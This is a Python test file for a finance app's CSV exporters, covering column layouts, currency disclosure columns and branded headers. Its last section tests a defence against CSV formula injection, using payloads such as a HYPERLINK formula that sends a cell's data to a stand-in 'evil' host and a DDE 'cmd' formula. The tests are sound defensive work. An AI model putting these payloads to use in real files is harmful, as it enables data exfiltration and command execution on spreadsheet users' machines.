"""CSV report exporters.

The exporters are pure functions: row iterable in, CSV string out.
Tests pin the column shape (header row + per-row layout) so a
regression that drops a column doesn't silently change the format
finance teams import into their downstream tools.

The format itself matters: trailing newline; Decimal columns
quantized to 2dp; enum status reads `.value`; missing fields emit
empty strings (not "None" or "null").
"""

from __future__ import annotations

import csv
import io
import uuid
from datetime import UTC, date, datetime
from decimal import Decimal
from types import SimpleNamespace

from app.services.branding import get_brand_context
from app.services.report_export import (
    EXPORTERS,
    brand_provenance_header,
    csv_safe_cell,
    export_aging_snapshot,
    export_cashflow_forecast,
    export_invoice_register,
    export_payment_register,
    export_vendor_spend,
)


def _read(csv_text: str) -> list[list[str]]:
    return list(csv.reader(io.StringIO(csv_text)))


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------


def test_exporters_registry_lists_all_reports():
    assert set(EXPORTERS) == {
        "invoice_register",
        "vendor_spend",
        "payment_register",
        "aging_snapshot",
        "cashflow_forecast",
        "expense_register",
    }


# ---------------------------------------------------------------------------
# cashflow_forecast
# ---------------------------------------------------------------------------


def test_cashflow_forecast_header_and_row_order():
    rows = [
        {
            "period": "2026-06",
            "period_start": date(2026, 6, 1),
            "period_end": date(2026, 6, 30),
            "scheduled_amount": Decimal("1500.00"),
            "committed_amount": Decimal("1000.00"),
            "pending_amount": Decimal("500.00"),
            "discount_eligible_amount": Decimal("250.00"),
            "count": 3,
        }
    ]
    out = _read(export_cashflow_forecast(rows))
    assert out[0] == [
        "period",
        "period_start",
        "period_end",
        "scheduled_amount",
        "committed_amount",
        "pending_amount",
        "discount_eligible_amount",
        "count",
    ]
    assert out[1] == [
        "2026-06",
        "2026-06-01",
        "2026-06-30",
        "1500.00",
        "1000.00",
        "500.00",
        "250.00",
        "3",
    ]


def test_cashflow_forecast_empty_emits_header_only():
    out = _read(export_cashflow_forecast([]))
    assert len(out) == 1
    assert out[0][0] == "period"


# ---------------------------------------------------------------------------
# invoice_register
# ---------------------------------------------------------------------------


def test_invoice_register_header_matches_canonical_layout():
    """Pin the exact column order. Finance imports rely on this —
    a column reorder breaks every downstream pipeline."""
    csv_text = export_invoice_register([])
    rows = _read(csv_text)
    assert rows[0] == [
        "invoice_id",
        "invoice_number",
        "vendor_name",
        "amount",
        "currency",
        "status",
        "invoice_date",
        "due_date",
        "created_at",
        "po_number",
    ]


def test_invoice_register_emits_one_data_row_per_invoice():
    invs = [
        SimpleNamespace(
            id=uuid.uuid4(),
            invoice_number="INV-001",
            vendor_name="Acme",
            amount=Decimal("123.45"),
            currency="USD",
            status="approved",
            invoice_date=date(2026, 5, 1),
            due_date=date(2026, 6, 1),
            created_at=datetime(2026, 5, 1, 10, tzinfo=UTC),
            po_number="PO-9",
        ),
    ]
    rows = _read(export_invoice_register(invs))
    assert len(rows) == 2  # header + one data row
    assert rows[1][1] == "INV-001"
    assert rows[1][3] == "123.45"
    assert rows[1][5] == "approved"


def test_invoice_register_handles_enum_status():
    """The status column reads `.value` when the field is an enum
    — so the CSV gets `approved`, not `InvoiceStatus.approved`."""

    class _Status:
        value = "ready_for_review"

    inv = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_number="X",
        vendor_name="V",
        amount=Decimal("1"),
        currency="USD",
        status=_Status(),
        invoice_date=None,
        due_date=None,
        created_at=None,
        po_number=None,
    )
    rows = _read(export_invoice_register([inv]))
    assert rows[1][5] == "ready_for_review"


def test_invoice_register_missing_fields_emit_empty_not_none():
    """Empty string in the cell — NOT the literal "None". Finance
    teams parse on column position; a "None" string would import
    as the literal text."""
    inv = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_number=None,
        vendor_name=None,
        amount=None,
        currency=None,
        status=None,
        invoice_date=None,
        due_date=None,
        created_at=None,
        po_number=None,
    )
    rows = _read(export_invoice_register([inv]))
    # Every non-id cell should be empty.
    assert rows[1][1] == ""
    assert rows[1][2] == ""
    assert rows[1][3] == ""
    assert rows[1][9] == ""


# ---------------------------------------------------------------------------
# vendor_spend
# ---------------------------------------------------------------------------


#: The exported header, pinned in one place so the three cases below cannot
#: disagree about it. `unconverted_count` is APPENDED, never inserted — a
#: consumer reading by header keeps working, and one reading by position keeps
#: working for the four columns it already knew.
_VENDOR_SPEND_HEADER = [
    "vendor_name",
    "invoice_count",
    "total_amount",
    "currencies",
    "unconverted_count",
]


def test_vendor_spend_accepts_tuple_rows_from_sql_aggregation():
    """SQL aggregation returns `(vendor_name, count, total)`
    tuples; the exporter handles both tuples and ORM-like objects. A plain
    positional tuple carries no currency info, so both currency columns are
    blank."""
    rows_tuples = [
        ("Acme", 5, Decimal("12345.67")),
        ("Globex", 3, Decimal("9999.99")),
    ]
    csv_text = export_vendor_spend(rows_tuples)
    rows = _read(csv_text)
    assert rows[0] == _VENDOR_SPEND_HEADER
    assert rows[1] == ["Acme", "5", "12345.67", "", ""]


def test_vendor_spend_accepts_namespace_rows():
    rows = [
        SimpleNamespace(vendor_name="Acme", invoice_count=5, total_amount=Decimal("100")),
    ]
    out = _read(export_vendor_spend(rows))
    assert out[1] == ["Acme", "5", "100.00", "", ""]


def test_vendor_spend_accepts_vendor_spend_entry_rows():
    """The real caller: `currency_conversion.VendorSpendEntry` — the
    multi-currency-aware rollup result. `.vendor`/`.amount` (not
    `.vendor_name`/`.total_amount`), `.currencies` and `.unconverted_count`
    populate the two currency columns."""
    from app.services.currency_conversion import VendorSpendEntry

    rows = [
        VendorSpendEntry(
            vendor="Acme", amount=Decimal("300.00"), invoice_count=2, currencies=["EUR", "USD"]
        ),
    ]
    out = _read(export_vendor_spend(rows))
    assert out[0] == _VENDOR_SPEND_HEADER
    # A rollup that converted everything reports a real zero.
    assert out[1] == ["Acme", "2", "300.00", "EUR, USD", "0"]


def test_vendor_spend_reports_rows_folded_at_face_value():
    """The column the CSV needed more than any JSON surface did.

    A foreign invoice with no locked rate is summed into `total_amount` at FACE
    value. Every other spend surface can disclose that beside the figure; a CSV
    is opened later, in a spreadsheet, with no way back to the tenant that
    produced it, so the disclosure has to travel IN the file.
    """
    from app.services.currency_conversion import VendorSpendEntry

    rows = [
        VendorSpendEntry(
            vendor="Mixed Co",
            amount=Decimal("900.00"),
            invoice_count=2,
            currencies=["GBP", "USD"],
            unconverted_count=1,
        ),
    ]
    out = _read(export_vendor_spend(rows))
    assert out[1] == ["Mixed Co", "2", "900.00", "GBP, USD", "1"]


def test_vendor_spend_unknown_unconverted_count_is_blank_not_zero():
    """ "We did not ask" must not render as the reassuring "none".

    A legacy caller that exposes no `unconverted_count` has made no claim about
    convertibility, and `0` would read as "everything converted" — the same
    zero-vs-unknown confusion `docs/decisions.md` §34 rules on. Blank says
    nothing, which is the truth.
    """
    rows = [SimpleNamespace(vendor_name="Legacy Co", invoice_count=1, total_amount=Decimal("10"))]
    assert _read(export_vendor_spend(rows))[1][-1] == ""
    # ...while a rollup row that genuinely converted everything says "0".
    from app.services.currency_conversion import VendorSpendEntry

    clean = [
        VendorSpendEntry(
            vendor="Clean Co", amount=Decimal("10"), invoice_count=1, currencies=["USD"]
        )
    ]
    assert _read(export_vendor_spend(clean))[1][-1] == "0"


# ---------------------------------------------------------------------------
# payment_register
# ---------------------------------------------------------------------------


def test_payment_register_emits_paired_payment_and_invoice():
    payment = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_id=uuid.uuid4(),
        amount=Decimal("500"),
        method="ach",
        status="completed",
        provider="modern_treasury",
        reference="REF-123",
        submitted_at=datetime(2026, 5, 1, tzinfo=UTC),
        completed_at=datetime(2026, 5, 3, tzinfo=UTC),
    )
    invoice = SimpleNamespace(invoice_number="INV-001", vendor_name="Acme", currency="USD")
    out = _read(export_payment_register([(payment, invoice)]))
    assert out[0] == [
        "payment_id",
        "invoice_id",
        "invoice_number",
        "vendor_name",
        "amount",
        "currency",
        "method",
        "status",
        "provider",
        "reference",
        "submitted_at",
        "completed_at",
    ]
    assert out[1][2] == "INV-001"
    assert out[1][6] == "ach"
    assert out[1][8] == "modern_treasury"


def test_payment_register_handles_orphan_payment_with_no_invoice():
    """If the invoice was deleted, the SQL outer-join returns
    `(payment, None)`. We still emit the row (finance wants to see
    the money out) with the invoice columns blank."""
    payment = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_id=uuid.uuid4(),
        amount=Decimal("100"),
        method="ach",
        status="failed",
        provider=None,
        reference=None,
        submitted_at=None,
        completed_at=None,
    )
    out = _read(export_payment_register([(payment, None)]))
    assert len(out) == 2
    assert out[1][2] == ""  # invoice_number blank


def _sqlalchemy_rows(keys: list[str], data: list[tuple]) -> list:
    """Real `sqlalchemy.engine.row.Row` objects, built without a database.

    A `Row` is what every production caller actually passes (`rows.all()`), and
    it behaves differently from the plain tuples the other tests use — it is
    NOT an `isinstance(tuple)`. Building the genuine article is the only way to
    cover the shape that ships."""
    from sqlalchemy.engine.result import IteratorResult, SimpleResultMetaData

    return IteratorResult(SimpleResultMetaData(keys), iter(data)).all()


def test_payment_register_reads_a_sqlalchemy_row_not_just_a_tuple():
    """Both real callers pass `rows.all()` from a `select(Payment, Invoice)`
    join — SQLAlchemy `Row`s, which are `Sequence`s but NOT tuple instances.
    Branching on `isinstance(pair, (tuple, list))` missed every production
    call and fell into the bare-object branch, where a `Row` has none of the
    attributes looked up: the register exported one ALL-BLANK row per payment
    with a hardcoded `USD` as its only content."""
    payment = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_id=uuid.uuid4(),
        amount=Decimal("500"),
        method="ach",
        status="completed",
        provider="modern_treasury",
        reference="REF-123",
        submitted_at=datetime(2026, 5, 1, tzinfo=UTC),
        completed_at=datetime(2026, 5, 3, tzinfo=UTC),
    )
    invoice = SimpleNamespace(invoice_number="INV-001", vendor_name="Acme", currency="EUR")
    rows = _sqlalchemy_rows(["Payment", "Invoice"], [(payment, invoice)])
    assert not isinstance(rows[0], (tuple, list))  # the trap this test exists for

    out = _read(export_payment_register(rows))
    assert out[1][0] == str(payment.id)
    assert out[1][1] == str(payment.invoice_id)
    assert out[1][2] == "INV-001"
    assert out[1][3] == "Acme"
    assert out[1][4] == "500.00"
    assert out[1][5] == "EUR"  # the invoice's real currency, not a fallback
    assert out[1][6] == "ach"
    assert out[1][7] == "completed"
    assert out[1][8] == "modern_treasury"
    assert out[1][9] == "REF-123"


def test_payment_register_row_with_an_orphaned_invoice():
    """The outer join yields `(payment, None)` as a `Row` too."""
    payment = SimpleNamespace(
        id=uuid.uuid4(),
        invoice_id=uuid.uuid4(),
        amount=Decimal("100"),
        method="wire",
        status="failed",
        provider=None,
        reference=None,
        submitted_at=None,
        completed_at=None,
    )
    rows = _sqlalchemy_rows(["Payment", "Invoice"], [(payment, None)])
    out = _read(export_payment_register(rows))
    assert out[1][0] == str(payment.id)
    assert out[1][2] == ""  # invoice_number blank
    assert out[1][4] == "100.00"
    assert out[1][6] == "wire"


# ---------------------------------------------------------------------------
# aging_snapshot
# ---------------------------------------------------------------------------


def test_aging_snapshot_emits_single_row_with_totals():
    # Five buckets: current / 1-30 / 31-60 / 61-90 (days_90) / 90+ (BUG 7).
    buckets = {
        "current": Decimal("100"),
        "days_30": Decimal("200"),
        "days_60": Decimal("400"),
        "days_90": Decimal("800"),
        "days_90_plus": Decimal("1600"),
    }
    out = _read(export_aging_snapshot(buckets, snapshot_date=date(2026, 5, 10)))
    assert out[0] == [
        "as_of_date",
        "current",
        "days_30",
        "days_60",
        "days_90",
        "days_90_plus",
        "total",
        "reporting_currency",
        "unconverted_count",
    ]
    # Total sums all five buckets. A caller that names no currency and no
    # unconverted count gets both BLANK — never a guessed "USD" / "0".
    assert out[1] == [
        "2026-05-10",
        "100.00",
        "200.00",
        "400.00",
        "800.00",
        "1600.00",
        "3100.00",
        "",
        "",
    ]


def test_aging_snapshot_states_its_currency_and_unconverted_count():
    """The bands are in the org's reporting currency, with face-value fallbacks
    counted — a CSV has no other place to carry that caveat."""
    buckets = {
        "current": Decimal("300"),
        "days_60": Decimal("6700"),
        "days_90_plus": Decimal("500"),
        "reporting_currency": "USD",
        "unconverted_count": 1,
    }
    out = _read(export_aging_snapshot(buckets, snapshot_date=date(2026, 5, 10)))
    row = dict(zip(out[0], out[1], strict=True))
    assert row["total"] == "7500.00"
    assert row["reporting_currency"] == "USD"
    assert row["unconverted_count"] == "1"
    # Zero is an answer, distinct from "not asked".
    out = _read(export_aging_snapshot({"reporting_currency": "EUR", "unconverted_count": 0}))
    assert out[1][-2:] == ["EUR", "0"]


def test_aging_snapshot_keeps_61_90_separate_from_90_plus():
    """BUG 7 regression at the CSV layer: the 61-90 band (`days_90`) must be
    its own column, not folded into `days_90_plus`."""
    buckets = {"days_90": Decimal("750"), "days_90_plus": Decimal("250")}
    out = _read(export_aging_snapshot(buckets, snapshot_date=date(2026, 5, 10)))
    header = out[0]
    row = out[1]
    assert row[header.index("days_90")] == "750.00"
    assert row[header.index("days_90_plus")] == "250.00"


def test_aging_snapshot_empty_buckets_safe():
    """Empty input → zero row, not a crash."""
    out = _read(export_aging_snapshot({}))
    assert out[1][1:] == ["0.00", "0.00", "0.00", "0.00", "0.00", "0.00", "", ""]


# ---------------------------------------------------------------------------
# brand provenance header (white-label CSV branding)
# ---------------------------------------------------------------------------


def test_brand_provenance_header_none_brand_is_empty():
    """No brand context → empty string, so the per-report exporters stay
    byte-for-byte unchanged for any caller that doesn't thread brand through."""
    assert brand_provenance_header(None, org_name="Acme", report="invoice_register") == ""


def test_brand_provenance_header_carries_product_name_and_metadata():
    brand = get_brand_context({"brand": {"product_name": "Acme Pay", "accent_color": "#112233"}})
    at = datetime(2026, 6, 20, 14, 30, tzinfo=UTC)
    header = brand_provenance_header(
        brand, org_name="Acme Corp", report="invoice_register", generated_at=at
    )
    # Every line is a `#` comment; carries product name + org + report + time.
    lines = header.splitlines()
    assert all(ln.startswith("# ") for ln in lines)
    assert "Acme Pay" in lines[0]
    assert any("Acme Corp" in ln for ln in lines)
    assert any("invoice_register" in ln for ln in lines)
    assert any("2026-06-20 14:30 UTC" in ln for ln in lines)


def test_brand_provenance_default_product_name_when_no_brand_configured():
    """An org with no brand block → the platform default product name, no logo."""
    brand = get_brand_context(None)
    header = brand_provenance_header(brand, org_name="Acme", report="vendor_spend")
    assert "FeohLedger" in header.splitlines()[0]


def test_branded_csv_data_grid_still_parses_column_positionally():
    """The comment block precedes the data grid; a consumer skipping `#` lines
    reads the exact same header + rows as the unbranded CSV."""
    brand = get_brand_context({"brand": {"product_name": "Acme Pay"}})
    invs = [
        SimpleNamespace(
            id=uuid.uuid4(),
            invoice_number="INV-001",
            vendor_name="Acme",
            amount=Decimal("123.45"),
            currency="USD",
            status="approved",
            invoice_date=date(2026, 5, 1),
            due_date=date(2026, 6, 1),
            created_at=datetime(2026, 5, 1, 10, tzinfo=UTC),
            po_number="PO-9",
        ),
    ]
    branded = brand_provenance_header(
        brand, org_name="Acme", report="invoice_register"
    ) + export_invoice_register(invs)
    rows = [r for r in _read(branded) if not (r and r[0].startswith("#"))]
    # Header row + one data row remain, in canonical column order.
    assert rows[0][0] == "invoice_id"
    assert rows[1][1] == "INV-001"
    assert rows[1][3] == "123.45"


def test_brand_provenance_sanitizes_org_name_newline_injection():
    """A newline in the org name must not inject a fake comment/data line."""
    brand = get_brand_context({"brand": {"product_name": "Acme Pay"}})
    header = brand_provenance_header(
        brand, org_name="Acme\nInjected: evil", report="invoice_register"
    )
    org_lines = [ln for ln in header.splitlines() if ln.startswith("# Organization:")]
    assert len(org_lines) == 1
    assert "Injected: evil" in org_lines[0]  # folded onto one line, not a new row


# ---------------------------------------------------------------------------
# CSV formula-injection defense (CWE-1236, issue #172)
# ---------------------------------------------------------------------------


def test_csv_safe_cell_neutralizes_formula_leads():
    for payload in (
        '=HYPERLINK("http://evil/"&A1,"click")',
        "+1+1",
        "@SUM(A1:A9)",
        "=cmd|'/c calc'!A1",
        "\ttabbed",
        "\rcarriage",
    ):
        out = csv_safe_cell(payload)
        assert out == "'" + payload, payload


def test_csv_safe_cell_preserves_plain_values_and_numbers():
    # Ordinary text and bare (signed) numbers are untouched so numeric columns
    # still parse.
    assert csv_safe_cell("Acme Supply") == "Acme Supply"
    assert csv_safe_cell("-42.50") == "-42.50"
    assert csv_safe_cell("+5") == "+5"
    assert csv_safe_cell("123.45") == "123.45"
    # Non-strings pass straight through.
    assert csv_safe_cell(7) == 7
    assert csv_safe_cell(None) is None


def test_vendor_spend_export_quotes_malicious_vendor_name():
    """A vendor that names itself with a formula can't execute in a CFO's Excel —
    the exported cell is prefixed with a single quote."""
    evil = '=HYPERLINK("http://evil/"&A1,"x")'
    csv_text = export_vendor_spend([(evil, 3, Decimal("100.00"))])
    rows = _read(csv_text)
    assert rows[0] == _VENDOR_SPEND_HEADER
    assert rows[1][0] == "'" + evil
    # A legitimate negative total is still a parseable number.
    csv_text2 = export_vendor_spend([("Acme", 1, Decimal("-42.50"))])
    assert _read(csv_text2)[1] == ["Acme", "1", "-42.50", "", ""]
